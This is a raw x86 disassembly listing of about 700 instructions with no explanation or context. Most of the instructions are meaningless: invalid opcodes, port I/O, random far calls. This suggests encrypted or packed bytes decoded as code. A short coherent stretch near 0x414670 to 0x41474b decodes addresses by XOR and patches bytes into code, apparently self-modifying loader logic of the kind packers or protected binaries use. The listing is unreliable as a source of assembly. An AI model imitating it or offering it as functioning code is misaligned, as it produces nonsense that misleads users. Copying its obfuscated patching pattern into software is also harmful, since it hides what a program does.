  4143d7:	and    eax,0xdffc034d
  4143dc:	ins    BYTE PTR es:[edi],dx
  4143dd:	push   esi
  4143de:	ret    
  4143df:	sub    al,0x5d
  4143e1:	aas    
  4143e2:	js     0x414382
  4143e4:	setle  BYTE PTR ds:0x3589abad
  4143eb:	sub    dh,BYTE PTR [ebp+edi*4+0x23e957b9]
  4143f2:	push   esp
  4143f3:	push   ds
  4143f4:	pop    ds
  4143f5:	shr    esp,0xca
  4143f8:	sbb    al,0xc2
  4143fa:	imul   eax,DWORD PTR [eax],0xffffffe1
  4143fd:	stos   BYTE PTR es:[edi],al
  4143fe:	push   cs
  4143ff:	loopne 0x4143a6
  414401:	fdiv   QWORD PTR [ebp+0x33]
  414404:	jle    0x41440f
  414406:	bound  edi,QWORD PTR [ebp-0x62]
  414409:	popa   
  41440a:	cld    
  41440b:	pop    ebp
  41440c:	cmp    DWORD PTR [ebx+eax*1+0x75],esp
  414410:	push   esi
  414411:	add    BYTE PTR [eax-0x7a],al
  414414:	in     eax,0xc7
  414416:	lds    eax,FWORD PTR [ebp+0xf]
  414419:	mov    DWORD PTR [ecx],esi
  41441b:	sub    eax,0xb2886662
  414420:	je     0x41441d
  414422:	sub    al,0xe4
  414424:	mov    WORD PTR [edx+0x457528a],ss
  41442a:	jle    0x414464
  41442c:	test   al,0xff
  41442e:	cmc    
  41442f:	mov    bh,0xc
  414431:	inc    ebp
  414432:	and    al,0xa8
  414434:	push   edx
  414435:	mov    al,0x37
  414437:	repnz mov ecx,0xaff78b4
  41443d:	sbb    DWORD PTR [ecx+0x19],0xd23b054c
  414444:	inc    edx
  414445:	adc    cl,BYTE PTR [ebx]
  414447:	ror    DWORD PTR ds:0x13c0126d,cl
  41444d:	dec    ecx
  41444e:	lods   eax,DWORD PTR ds:[esi]
  41444f:	mov    BYTE PTR [eax+0x1d],dh
  414452:	(bad)  
  414453:	mov    dh,0x77
  414455:	imul   eax,ebx,0xffffffa9
  414458:	fstp   TBYTE PTR [eax]
  41445a:	aad    0x87
  41445c:	out    0x4e,eax
  41445e:	push   0xf843151d
  414463:	popa   
  414464:	mov    dh,0xa0
  414466:	jae    0x41446b
  414468:	sub    ecx,DWORD PTR [edx]
  41446a:	in     al,0x1a
  41446c:	sahf   
  41446d:	mov    al,0x80
  41446f:	das    
  414470:	dec    BYTE PTR [ebp-0x61330461]
  414476:	test   BYTE PTR [esi+0x2597188d],bl
  41447c:	daa    
  41447d:	das    
  41447e:	xchg   esi,eax
  41447f:	and    BYTE PTR [edi-0x67e4e965],cl
  414485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414486:	addr16 cmp esi,esi
  414489:	scas   al,BYTE PTR es:[edi]
  41448a:	daa    
  41448b:	xlat   BYTE PTR ds:[ebx]
  41448c:	lds    eax,FWORD PTR [edi]
  41448e:	bound  esi,QWORD PTR [edx]
  414490:	jl     0x414456
  414492:	dec    eax
  414493:	inc    edx
  414494:	(bad)  
  414495:	adc    al,0x44
  414497:	(bad)  
  414498:	pop    edi
  414499:	fwait
  41449a:	xor    eax,0x54c0d156
  41449f:	push   0xcd4982b
  4144a4:	(bad)  
  4144a5:	xchg   edi,eax
  4144a6:	fld    QWORD PTR [edx]
  4144a8:	aaa    
  4144a9:	push   esp
  4144aa:	pusha  
  4144ab:	pop    edx
  4144ac:	mov    eax,ebp
  4144ae:	jns    0x414458
  4144b0:	adc    eax,0xc4553ff
  4144b5:	lods   eax,DWORD PTR ds:[esi]
  4144b6:	push   ecx
  4144b7:	sti    
  4144b8:	push   esp
  4144b9:	xchg   ebp,eax
  4144ba:	or     bh,ch
  4144bc:	jnp    0x414518
  4144be:	iret   
  4144bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144c0:	mov    edx,0xd0b457f
  4144c5:	xchg   edi,eax
  4144c6:	and    DWORD PTR [eax+0x5c200947],0xffffff84
  4144cd:	mov    al,0xbc
  4144cf:	adc    bh,cl
  4144d1:	mov    dh,0xef
  4144d3:	cmp    eax,0xc09ec4e6
  4144d8:	icebp  
  4144d9:	mov    ebx,0xe1cf984b
  4144de:	xchg   ecx,eax
  4144df:	ficom  WORD PTR ds:0x97ec0c02
  4144e5:	test   eax,0xabbeb2c7
  4144ea:	lahf   
  4144eb:	adc    al,0x34
  4144ed:	xchg   dh,dh
  4144ef:	xlat   BYTE PTR ds:[ebx]
  4144f0:	mov    ebx,DWORD PTR [ebx]
  4144f2:	pop    ss
  4144f3:	xor    dl,dl
  4144f5:	test   DWORD PTR [esi],0x7cbae8f1
  4144fb:	mov    ebp,DWORD PTR [edx+edi*4+0x7d]
  4144ff:	test   BYTE PTR [ebx+eax*2-0x71f90f3c],dh
  414506:	xor    BYTE PTR ds:0x260423b,al
  41450c:	add    eax,0xcd07ae08
  414511:	in     eax,dx
  414512:	dec    eax
  414513:	dec    edx
  414514:	xchg   ebp,eax
  414515:	outs   dx,DWORD PTR ds:[esi]
  414516:	fwait
  414517:	push   edx
  414518:	pop    ecx
  414519:	xor    ch,al
  41451b:	pop    ebx
  41451c:	lods   eax,DWORD PTR ds:[esi]
  41451d:	or     DWORD PTR [ebx+ecx*4],edx
  414520:	mov    al,ds:0xf51e653
  414525:	not    BYTE PTR [esi]
  414527:	jnp    0x41453d
  414529:	or     al,BYTE PTR [edi-0x71548600]
  41452f:	xchg   edi,eax
  414530:	dec    ecx
  414531:	popa   
  414532:	xchg   esi,eax
  414533:	scas   al,BYTE PTR es:[edi]
  414534:	in     al,0xf
  414536:	(bad)  
  414537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414538:	inc    edi
  414539:	sahf   
  41453a:	xchg   edi,eax
  41453b:	das    
  41453c:	loopne 0x4144f3
  41453e:	or     edi,DWORD PTR [ecx]
  414540:	xchg   ebx,eax
  414541:	mov    edi,0x7b368e69
  414546:	inc    ecx
  414547:	mov    fs,ecx
  414549:	outs   dx,BYTE PTR ds:[esi]
  41454a:	jmp    edi
  41454c:	repnz add ch,cl
  41454f:	test   BYTE PTR [eax+0x24],bh
  414552:	into   
  414553:	xchg   edi,eax
  414554:	jnp    0x41457d
  414556:	and    eax,0x2995b881
  41455b:	sbb    ecx,edx
  41455d:	not    BYTE PTR [ecx+edx*1-0x60]
  414561:	(bad)  
  414563:	repz mov ebx,0xefab44f1
  414569:	imul   edi,DWORD PTR [eax-0x7],0xfffffffa
  41456d:	sub    ch,dl
  41456f:	pop    edi
  414570:	mov    ds:0x337af8bd,eax
  414575:	(bad)  
  414576:	jg     0x41457b
  414578:	xchg   edx,eax
  414579:	mov    esp,0x4fa90895
  41457e:	aad    0x99
  414580:	outs   dx,DWORD PTR ds:[esi]
  414581:	daa    
  414582:	add    BYTE PTR [eax+0x5f],al
  414585:	sub    ecx,DWORD PTR [edx+0x59f041ef]
  41458b:	adc    BYTE PTR [eax],ch
  41458d:	psubsw mm3,QWORD PTR [eax]
  414590:	mov    WORD PTR [edi],?
  414592:	dec    ebx
  414593:	rol    DWORD PTR [edi+ecx*4+0x40748ce1],0xc5
  41459b:	add    cl,dh
  41459d:	mov    edi,0xbefbddab
  4145a2:	int    0xc0
  4145a4:	imul   edx,DWORD PTR gs:[edi-0x33aa638f],0x7dc05bde
  4145af:	adc    al,0x7c
  4145b1:	es fwait
  4145b3:	jb     0x41457e
  4145b5:	mov    edi,0xdbe27de9
  4145ba:	and    ch,BYTE PTR [eax+0x3032424c]
  4145c0:	push   edi
  4145c1:	sar    DWORD PTR [esi-0x4c3f72fb],cl
  4145c7:	enter  0x929a,0xb9
  4145cb:	mov    ch,0x75
  4145cd:	adc    ebx,DWORD PTR [esi+0x201bda42]
  4145d3:	lods   eax,DWORD PTR ds:[si]
  4145d5:	pop    es
  4145d6:	mov    bh,0xa9
  4145d8:	mov    al,0x6e
  4145da:	and    ch,bh
  4145dc:	ret    0x3d63
  4145df:	(bad)  
  4145e1:	or     al,0x32
  4145e3:	mov    edx,0xdcd4ec90
  4145e8:	jno    0x41456a
  4145ea:	cmp    al,0x7a
  4145ec:	mov    al,0x29
  4145ee:	ja     0x414659
  4145f0:	xchg   ebx,eax
  4145f1:	int    0x70
  4145f3:	push   ss
  4145f4:	adc    DWORD PTR [eax-0x77be0a4b],esi
  4145fa:	pop    esp
  4145fb:	retf   0xb57
  4145fe:	pop    ebp
  4145ff:	xchg   ecx,eax
  414600:	repz push eax
  414602:	mov    esp,0xfa639801
  414607:	pop    ds
  414608:	xchg   ecx,eax
  414609:	ror    eax,cl
  41460b:	push   esp
  41460c:	in     al,0x31
  41460e:	fucom  st(0)
  414610:	inc    edi
  414611:	stc    
  414612:	and    DWORD PTR [eax+0x19],esp
  414615:	addr16 cld 
  414617:	div    DWORD PTR [esp+edi*8]
  41461a:	cmp    ebx,DWORD PTR es:[esi+edi*1]
  41461e:	call   0x9e88e67b
  414623:	cli    
  414624:	fsubr  DWORD PTR [edi]
  414626:	dec    edx
  414627:	cld    
  414628:	call   0xcd8efcc2
  41462d:	mov    ecx,eax
  41462f:	js     0x414619
  414631:	mov    ecx,0xe9eed741
  414636:	mov    ch,0x95
  414638:	retf   
  414639:	cmp    bh,BYTE PTR [esi]
  41463b:	xor    al,0xd1
  41463d:	fdivr  st(1),st
  41463f:	jo     0x4145e7
  414641:	push   es
  414642:	jae    0x414614
  414644:	jmp    0x414604
  414646:	or     al,0x50
  414648:	mov    ds:0x969cfbb7,al
  41464d:	(bad)  
  41464f:	or     DWORD PTR [edx],edx
  414651:	xchg   edx,eax
  414652:	aam    0xfa
  414654:	and    eax,0x9b09e95
  414659:	das    
  41465a:	cmp    dh,al
  41465c:	sbb    edi,0x4d
  41465f:	aam    0x7b
  414661:	int3   
  414662:	push   ebp
  414663:	mov    bl,dh
  414665:	mov    esp,0x63330f33
  41466a:	test   DWORD PTR [ecx+0x3c6336c],ecx
  414670:	(bad)  
  414671:	push   eax
  414672:	mov    eax,DWORD PTR [ebp-0x1c]
  414675:	xor    eax,esi
  414677:	add    eax,edi
  414679:	push   eax
  41467a:	mov    eax,DWORD PTR [ebp-0x10]
  41467d:	xor    eax,esi
  41467f:	add    eax,edi
  414681:	push   eax
  414682:	lea    eax,[ebp-0x90]
  414688:	push   eax
  414689:	push   DWORD PTR [ebp-0x20]
  41468c:	push   DWORD PTR [ebp-0x30]
  41468f:	call   0x40f89f
  414694:	test   eax,eax
  414696:	je     0x4146c7
  41469c:	lea    eax,[ebp-0x90]
  4146a2:	push   eax
  4146a3:	mov    eax,DWORD PTR [ebp-0x30]
  4146a6:	xor    eax,esi
  4146a8:	add    eax,edi
  4146aa:	push   eax
  4146ab:	mov    eax,DWORD PTR [ebp-0x2c]
  4146ae:	add    eax,0xaa
  4146b3:	push   eax
  4146b4:	mov    eax,DWORD PTR [ebp-0x2c]
  4146b7:	mov    eax,DWORD PTR [eax+0x198]
  4146bd:	push   DWORD PTR [eax]
  4146bf:	call   0x40867e
  4146c4:	mov    DWORD PTR [ebp-0x40],eax
  4146c7:	lea    eax,[ebp+0x4]
  4146ca:	mov    DWORD PTR [ebp-0x34],eax
  4146cd:	mov    eax,DWORD PTR [ebp-0x8]
  4146d0:	mov    eax,DWORD PTR [eax]
  4146d2:	mov    eax,DWORD PTR [eax]
  4146d4:	mov    eax,DWORD PTR [eax]
  4146d6:	test   eax,eax
  4146d8:	je     0x416aa8
  4146de:	lea    eax,[ebp-0xc]
  4146e1:	mov    DWORD PTR [ebp-0x4c],eax
  4146e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4146e7:	mov    DWORD PTR [ebp-0xc],eax
  4146ea:	mov    eax,DWORD PTR [ebp-0x8]
  4146ed:	mov    eax,DWORD PTR [eax]
  4146ef:	mov    eax,DWORD PTR [eax]
  4146f1:	mov    eax,DWORD PTR [eax]
  4146f3:	sub    DWORD PTR [ebp-0xc],eax
  4146f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4146f9:	xor    ecx,esi
  4146fb:	mov    eax,0xffcd8d25
  414700:	sub    eax,ecx
  414702:	add    DWORD PTR [ebp-0xc],eax
  414705:	mov    eax,DWORD PTR [ebp-0xc]
  414708:	mov    ecx,DWORD PTR [ebp-0x8]
  41470b:	mov    ecx,DWORD PTR [ecx]
  41470d:	mov    ecx,DWORD PTR [ecx]
  41470f:	mov    ecx,DWORD PTR [ecx]
  414711:	mov    DWORD PTR [ecx+0x1],eax
  414714:	mov    al,BYTE PTR [ebp-0x1]
  414717:	mov    ecx,DWORD PTR [ebp-0x8]
  41471a:	mov    ecx,DWORD PTR [ecx]
  41471c:	mov    ecx,DWORD PTR [ecx]
  41471e:	mov    ecx,DWORD PTR [ecx]
  414720:	push   DWORD PTR [ebp-0x2c]
  414723:	xor    al,0x6f
  414725:	sub    al,0xd
  414727:	mov    BYTE PTR [ecx],al
  414729:	mov    eax,ds:0x423eca
  41472e:	push   DWORD PTR [eax]
  414730:	push   DWORD PTR ds:0x424126
  414736:	push   DWORD PTR ds:0x423ed2
  41473c:	push   DWORD PTR ds:0x424106
  414742:	push   DWORD PTR ds:0x42418e
  414748:	push   DWORD PTR [ebp-0x30]
  41474b:	jmp    0x416a9a
  414750:	jp     0x414751
  414752:	int    0x35
  414754:	ret    
  414755:	add    ecx,DWORD PTR [edx-0x41938645]
  41475b:	pop    ss
  41475c:	jg     0x414713
  41475e:	push   ss
  41475f:	loop   0x4146ed
  414761:	dec    eax
  414762:	popa   
  414763:	bound  edx,QWORD PTR [eax+0x5f]
  414766:	bound  esp,QWORD PTR [edx-0x8]
  414769:	fdiv   QWORD PTR [eax-0x1bec345b]
  41476f:	dec    eax
  414770:	and    dl,bh
  414772:	test   eax,0x7a6f3bf3
  414777:	in     eax,0x0
  414779:	daa    
  41477a:	call   FWORD PTR [edx+0x415b869a]
  414780:	ja     0x4147cf
  414782:	pushf  
  414783:	xchg   ebx,eax
  414784:	fsub   QWORD PTR ds:0x3bfe5fd7
  41478a:	sahf   
  41478b:	or     ah,BYTE PTR [esi-0x69]
  41478e:	push   ebp
  41478f:	pop    ebp
  414790:	or     eax,0x74f310b3
  414795:	xchg   ebx,eax
  414796:	in     al,0xfe
  414798:	rol    DWORD PTR [ebp-0x74],0x71
  41479c:	clc    
  41479d:	sbb    dl,BYTE PTR [esi]
  41479f:	scas   al,BYTE PTR es:[edi]
  4147a0:	in     al,0xe1
  4147a2:	les    ebp,FWORD PTR [ebp-0x234a366f]
  4147a8:	test   al,0x65
  4147aa:	and    bl,BYTE PTR [eax+0x78]
  4147ad:	jp     0x41474e
  4147af:	test   al,0x12
  4147b1:	pop    ss
  4147b2:	nop
  4147b3:	or     DWORD PTR [ebx],0x5760c623
  4147b9:	mov    esi,eax
  4147bb:	cmp    BYTE PTR [esi+0x19f009a],cl
  4147c1:	dec    edi
  4147c2:	sti    
  4147c3:	inc    ebp
  4147c4:	jge    0x414807
  4147c6:	cdq    
  4147c7:	cmp    ebx,DWORD PTR [ebp+0x4e]
  4147ca:	adc    al,0x2
  4147cc:	jbe    0x4147c5
  4147ce:	mov    DWORD PTR [esi+0x62],edx
  4147d1:	ins    DWORD PTR es:[edi],dx
  4147d2:	stos   DWORD PTR es:[edi],eax
  4147d3:	push   ecx
  4147d4:	adc    ah,bl
  4147d6:	dec    edx
  4147d7:	aam    0x70
  4147d9:	and    BYTE PTR [ebx],ch
  4147db:	xchg   edi,eax
  4147dc:	mov    DWORD PTR [edi-0x782dff73],ecx
  4147e2:	imul   edi,edi,0x2e
  4147e5:	mov    eax,ds:0x3a084f1a
  4147ea:	ins    BYTE PTR es:[edi],dx
  4147eb:	sbb    BYTE PTR [eax+edx*4],dh
  4147ee:	mov    bh,0xed
  4147f0:	xchg   dh,ch
  4147f2:	and    dh,bl
  4147f4:	in     eax,0x97
  4147f6:	inc    edx
  4147f7:	xor    ah,al
  4147f9:	lahf   
  4147fa:	xor    al,0x18
  4147fc:	inc    esp
  4147fd:	fistp  QWORD PTR [esi+0x79]
  414800:	mov    ecx,0x6e95af38
  414805:	xchg   dh,ah
  414807:	out    dx,al
  414808:	mov    eax,ds:0xbf38762
  41480d:	pushf  
  41480e:	fstp   DWORD PTR [ecx-0x4c]
  414811:	retf   0x9f31
  414814:	mov    esp,DWORD PTR [ebp+eax*8+0x76b6692e]
  41481b:	jp     0x41486a
  41481d:	mov    edx,0x9475d964
  414822:	int    0xcb
  414824:	pop    ds
  414825:	mov    al,ds:0xaac5e696
  41482a:	jae    0x414842
  41482c:	outs   dx,BYTE PTR ds:[esi]
  41482d:	rcr    DWORD PTR [ecx],cl
  41482f:	xlat   BYTE PTR ds:[ebx]
  414830:	cdq    
  414831:	mov    fs,WORD PTR [ecx-0x75d686e0]
  414837:	xor    DWORD PTR [esi+0x61],edx
  41483a:	mov    bh,al
  41483c:	ins    DWORD PTR es:[edi],dx
  41483d:	mov    ch,0x6
  41483f:	repz inc ecx
  414841:	lahf   
  414842:	dec    eax
  414843:	retf   0xb745
  414846:	push   edi
  414847:	cmp    DWORD PTR [esi+0x1],ecx
  41484a:	dec    esi
  41484b:	add    dh,BYTE PTR [esi+esi*1+0x40]
  41484f:	inc    edx
  414850:	push   0xffffff9d
  414852:	jnp    0x4148b7
  414854:	daa    
  414855:	call   0xa065:0xd3e8e27d
  41485c:	leave  
  41485d:	inc    ebx
  41485e:	xor    bl,BYTE PTR [ecx+ebp*8]
  414861:	test   al,0x6
  414863:	das    
  414864:	cmp    DWORD PTR [ecx],eax
  414866:	adc    eax,0xc016ad3e
  41486b:	and    cl,bh
  41486d:	lock pop edx
  41486f:	cs addr16 pop ebp
  414872:	inc    ebx
  414873:	or     ebx,DWORD PTR [ebp-0x6ac5417c]
  414879:	xchg   edx,eax
  41487a:	stos   BYTE PTR es:[edi],al
  41487b:	mov    eax,ds:0x1d1457e0
  414880:	dec    ecx
  414881:	ins    DWORD PTR es:[edi],dx
  414882:	call   0x23c9:0x22a496fb
  414889:	ins    BYTE PTR es:[edi],dx
  41488a:	jae    0x414872
  41488c:	pop    edx
  41488d:	push   es
  41488e:	mov    dh,0x3b
  414890:	pop    ds
  414891:	call   0x5bedd546
  414896:	std    
  414897:	call   0x2e93:0xf0d4942
  41489e:	test   al,0xb1
  4148a0:	lods   eax,DWORD PTR ds:[esi]
  4148a1:	ins    BYTE PTR es:[edi],dx
  4148a2:	out    dx,al
  4148a3:	adc    eax,0xdec99b0b
  4148a8:	and    DWORD PTR [edx],esi
  4148aa:	mov    sp,WORD PTR [edi]
  4148ad:	out    dx,eax
  4148ae:	sbb    DWORD PTR [esi],ebp
  4148b0:	mov    esi,0x52bd16f2
  4148b5:	adc    al,0xab
  4148b7:	lods   al,BYTE PTR ds:[esi]
  4148b8:	and    BYTE PTR [edx+0x36],0xe3
  4148bc:	xor    BYTE PTR [ebx+0x4a],ah
  4148bf:	daa    
  4148c0:	mov    esi,0xbbe3358a
  4148c5:	ror    DWORD PTR [edi+0x41f6e6a0],0x20
  4148cc:	das    
  4148cd:	pop    edi
  4148ce:	push   edx
  4148cf:	(bad)  [edx]
  4148d1:	jae    0x414866
  4148d3:	mov    al,0x7d
  4148d5:	jb     0x4148b7
  4148d7:	inc    edi
  4148d8:	fld    st(1)
  4148da:	mov    dh,0xc8
  4148dc:	out    dx,al
  4148dd:	dec    esp
  4148de:	xchg   edx,eax
  4148df:	push   es
  4148e0:	ins    BYTE PTR es:[edi],dx
  4148e1:	das    
  4148e2:	shl    DWORD PTR [eax],cl
  4148e4:	inc    esi
  4148e5:	retf   0xb3e3
  4148e8:	push   esi
  4148e9:	pushf  
  4148ea:	add    al,0x63
  4148ec:	scas   al,BYTE PTR es:[edi]
  4148ed:	mov    esi,0x3ee7d8de
  4148f2:	jg     0x414913
  4148f4:	jmp    FWORD PTR ds:0x2be28da0
  4148fa:	outs   dx,BYTE PTR ds:[esi]
  4148fb:	adc    al,0xe7
  4148fd:	aad    0x2f
  4148ff:	cmc    
  414900:	pop    esi
  414901:	fmulp  st(6),st
  414903:	jmp    0x4148bb
  414905:	xor    BYTE PTR [edx+0x27589fc1],0x9a
  41490c:	mov    ecx,0x8e8f1f2c
  414911:	jp     0x41494b
  414913:	loop   0x414966
  414915:	call   FWORD PTR [edi-0x2fd85f12]
  41491b:	adc    esi,DWORD PTR [ebx-0x7a]
  41491e:	xchg   edx,eax
  41491f:	jno    0x41492b
  414921:	push   ecx
  414922:	jne    0x4148a9
  414924:	pop    ebp
  414925:	mov    bl,0xca
  414927:	jns    0x414975
  414929:	dec    ebx
  41492a:	out    dx,al
  41492b:	cmp    DWORD PTR [eax-0x5d704174],edx
  414931:	or     al,0x59
  414933:	add    al,0xac
  414935:	test   DWORD PTR [eax+eax*8+0x4e],ebx
  414939:	sub    al,0xe6
  41493b:	xchg   dl,dh
  41493d:	stos   BYTE PTR es:[edi],al
  41493e:	jecxz  0x4148df
  414940:	inc    eax
  414941:	pop    es
  414942:	je     0x414974
  414944:	call   DWORD PTR [esi-0x6d]
  414947:	and    DWORD PTR [esi-0x7c15eb5e],esp
  41494d:	test   eax,0x76d1a650
  414952:	(bad)  
  414954:	dec    ecx
  414955:	(bad)  
  414956:	dec    ecx
  414957:	jo     0x4149bf
  414959:	fidivr DWORD PTR [edx+ecx*1]
  41495c:	in     al,0x33
  41495e:	sub    ah,dh
  414960:	ret    
  414961:	rcl    DWORD PTR [edx],0x54
  414964:	mov    cl,0xc0
  414966:	mov    ds:0x5baffd09,al
  41496b:	mov    BYTE PTR [edi],ah
  41496d:	popa   
  41496e:	test   al,0x4d
  414970:	xchg   esi,eax
  414971:	out    0xca,eax
  414973:	jns    0x414918
  414975:	mov    edi,0xbbd66e2c
  41497a:	add    BYTE PTR [edi+0x64],ah
  41497d:	ins    DWORD PTR es:[edi],dx
  41497e:	cmp    DWORD PTR [eax+0x46],esi
  414981:	mov    edi,0xe62d362e
  414986:	mov    bl,0x69
  414988:	retf   0x3d89
  41498b:	jge    0x414a0a
  41498d:	out    dx,al
  41498e:	in     eax,dx
  41498f:	je     0x4149ea
  414991:	xchg   BYTE PTR [edi],dh
  414993:	sbb    DWORD PTR [eax-0x57],0x58
  414997:	jne    0x414a08
  414999:	idiv   al
  41499b:	push   0x8e173c78
  4149a0:	mov    bl,0x50
  4149a2:	push   0xffffff9a
  4149a4:	arpl   WORD PTR [ebp+0x70eabbd0],sp
  4149aa:	ins    BYTE PTR es:[edi],dx
  4149ab:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ad:	outs   dx,BYTE PTR ds:[esi]
  4149ae:	aaa    
  4149af:	out    0x66,eax
  4149b1:	aaa    
  4149b2:	pop    edi
  4149b3:	mov    bl,0x8f
  4149b5:	cmp    al,0x6d
  4149b7:	sub    ah,BYTE PTR [ecx-0x580a84e5]
  4149bd:	sub    ah,BYTE PTR [ebp-0x3f6afb33]
  4149c3:	push   0x40
  4149c5:	jo     0x4149dc
  4149c7:	mov    ds:0xb4cefeaf,eax
  4149cc:	test   DWORD PTR [eax-0x11c7990c],0xb079cb19
  4149d6:	imul   esi,eax,0x2c
  4149d9:	fadd   QWORD PTR [ebp-0x17]
  4149dc:	mov    dh,0x8c
  4149de:	adc    dh,BYTE PTR [esi+0x526f31c3]
  4149e4:	ins    BYTE PTR es:[edi],dx
  4149e5:	lock imul BYTE PTR [ecx-0x46]
  4149e9:	shl    BYTE PTR [ebx],0xd9
  4149ec:	mov    BYTE PTR [edx],cl
  4149ee:	pop    esp
  4149ef:	and    eax,0xe0d18b98
  4149f4:	inc    edx
  4149f5:	lds    esp,FWORD PTR [eax-0x19]
  4149f8:	stc    
  4149f9:	out    dx,eax
  4149fa:	inc    ebp
  4149fb:	sti    
  4149fc:	pop    ss
  4149fd:	dec    esp
  4149fe:	scas   al,BYTE PTR es:[edi]
  4149ff:	pusha  
  414a00:	jne    0x4149da
  414a02:	add    DWORD PTR [esi-0x3f],esi
  414a05:	test   al,0x38
  414a07:	out    dx,eax
  414a08:	push   es
  414a09:	ins    BYTE PTR es:[edi],dx
  414a0a:	ds cwde 
  414a0c:	enter  0xb3d7,0xa1
  414a10:	stc    
  414a11:	mov    al,0x56
  414a13:	sub    DWORD PTR [edx-0x95b0b2d],ecx
  414a19:	xchg   ebp,eax
  414a1a:	cmp    ebx,DWORD PTR [ebx-0x51]
  414a1d:	push   ss
  414a1e:	pop    eax
  414a1f:	add    dl,0xa2
  414a22:	inc    ecx
  414a23:	and    al,0xaf
  414a25:	out    0xe,eax
  414a27:	jmp    0x414a33
  414a29:	std    
  414a2a:	adc    eax,0x6cd807ae
  414a2f:	mov    al,ds:0x41163516
  414a34:	enterw 0x1d50,0x89
  414a39:	lahf   
  414a3a:	xor    DWORD PTR [ecx+ebx*4],ebp
  414a3d:	shr    DWORD PTR [ebx+ecx*8+0x56],1
  414a41:	popf   
  414a42:	cmp    al,0x53
  414a44:	mov    esi,0xaa704e5b
  414a49:	aam    0xdc
  414a4b:	cdq    
  414a4c:	cmp    DWORD PTR [edx],0x0
  414a4f:	iret   
  414a50:	pop    eax
  414a51:	std    
  414a52:	je     0x4149e1
  414a54:	mov    ebp,0x89e17940
  414a59:	cmp    eax,0x7b8a3c67
  414a5e:	inc    edi
  414a5f:	shl    BYTE PTR [ebx-0x3b0c81af],1
  414a65:	les    ebx,FWORD PTR [ebx]
  414a67:	leave  
  414a68:	inc    esp
  414a69:	int    0xf4
  414a6b:	int    0x7f
  414a6d:	sub    BYTE PTR [ebp-0x44244f3d],cl
  414a73:	test   al,0x3b
  414a75:	das    
  414a76:	ss and ebp,esp
  414a79:	jae    0x414a6d
  414a7b:	ficom  DWORD PTR [esp+ebx*1+0x56d50c26]
  414a82:	rol    BYTE PTR [ebx+0x5710403b],0x14
  414a89:	xchg   DWORD PTR [ebp-0x6e67801f],edx
  414a8f:	test   DWORD PTR [ecx-0x4b],0x6dde9391
  414a96:	mov    dl,0x75
  414a98:	mov    ds:0x715827cc,al
  414a9d:	lds    esp,FWORD PTR [ebx]
  414a9f:	pop    esp
  414aa0:	pop    ecx
  414aa1:	push   ecx
  414aa2:	aad    0x5b
  414aa4:	call   0x79f8e8bb
  414aa9:	jmp    0x414a47
  414aab:	mov    edi,0x8aa21f7a
  414ab0:	xchg   ecx,edi
  414ab2:	cmp    DWORD PTR [ecx-0x14],0x4e
  414ab6:	mov    edi,0xc6acb78c
  414abb:	and    BYTE PTR [esp+edi*8],dl
  414abe:	lea    ebx,[eax]
  414ac0:	push   ecx
  414ac1:	mov    ebp,0xc54ee6fc
  414ac6:	mov    ah,BYTE PTR es:[ebp+0x2c]
  414aca:	adc    al,0x6d
  414acc:	dec    ecx
  414acd:	call   0xee08:0x29962829
  414ad4:	add    eax,0x9efbd5ce
  414ad9:	aad    0xb4
  414adb:	icebp  
  414adc:	fsubr  st(0),st
  414ade:	mov    ss,esi
  414ae0:	lahf   
  414ae1:	out    0x63,al
  414ae3:	jo     0x414a8d
  414ae5:	mov    al,0x1
  414ae7:	call   0xf49df717
  414aec:	cmc    
  414aed:	cwde   
  414aee:	sbb    ah,bh
  414af0:	mov    ds:0x185ac43a,eax
  414af5:	dec    esp
  414af6:	push   es
  414af7:	cwde   
  414af8:	in     al,dx
  414af9:	fsub   st(1),st
  414afb:	dec    ebp
  414afc:	add    ebp,DWORD PTR [eax]
  414afe:	pop    edx
  414aff:	jno    0x414ae1
  414b01:	sub    BYTE PTR [eax-0x677e2c1c],bl
  414b07:	xor    edi,ecx
  414b09:	out    dx,al
  414b0a:	test   eax,0x5522f505
  414b0f:	mov    al,0x42
  414b11:	mov    edx,0x2db6c79a
  414b16:	cli    
  414b17:	fdivr  DWORD PTR [ebx-0x6f]
  414b1a:	in     eax,dx
  414b1b:	lahf   
  414b1c:	mov    ch,0xfd
  414b1e:	out    dx,eax
  414b1f:	or     ch,cl
  414b21:	aaa    
  414b22:	or     BYTE PTR [edi],ah
  414b24:	push   edx
  414b25:	lods   eax,DWORD PTR ds:[esi]
  414b26:	mov    ds:0x7c22e985,al
  414b2b:	push   esp
  414b2c:	push   0xfffffff3
  414b2e:	clc    
  414b2f:	jnp    0x414b8c
  414b31:	mov    WORD PTR [ebp-0x6c8fa25a],fs
  414b37:	das    
  414b38:	push   edi
  414b39:	push   ds
  414b3a:	push   es
  414b3b:	cmp    al,0x6b
  414b3d:	bound  esi,QWORD PTR [ecx+0x3f]
  414b40:	jp     0x414b48
  414b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b43:	rol    BYTE PTR [eax],0xd8
  414b46:	out    dx,eax
  414b47:	dec    eax
  414b48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b49:	je     0x414ae2
  414b4b:	pop    es
  414b4c:	dec    edi
  414b4d:	mov    eax,0x78b2ccd
  414b52:	mov    ebp,DWORD PTR [edx-0x27f99ac4]
  414b58:	pushf  
  414b59:	rcl    BYTE PTR [ebx],cl
  414b5b:	xor    BYTE PTR [esi-0x5],0x3d
  414b5f:	test   al,0x38
  414b61:	lods   eax,DWORD PTR ds:[esi]
  414b62:	pop    ss
  414b63:	sbb    eax,0xf6e88da4
  414b68:	xchg   ecx,eax
  414b69:	push   cs
  414b6a:	mov    al,ds:0xa3b032f8
  414b6f:	pop    DWORD PTR ds:0xb2b21d52
  414b75:	jno    0x414bcc
  414b77:	push   edx
  414b78:	xor    esi,DWORD PTR [eax-0x1]
  414b7b:	fld    DWORD PTR [edi]
  414b7d:	jl     0x414bf0
  414b7f:	xor    BYTE PTR [eax+0x7689551e],dh
  414b85:	dec    ebp
  414b86:	or     ebp,DWORD PTR [eax+0x14]
  414b89:	pop    ecx
  414b8a:	jb     0x414b3a
  414b8c:	xor    eax,DWORD PTR [ecx-0x2]
  414b8f:	in     al,0x23
  414b91:	ds pop ss
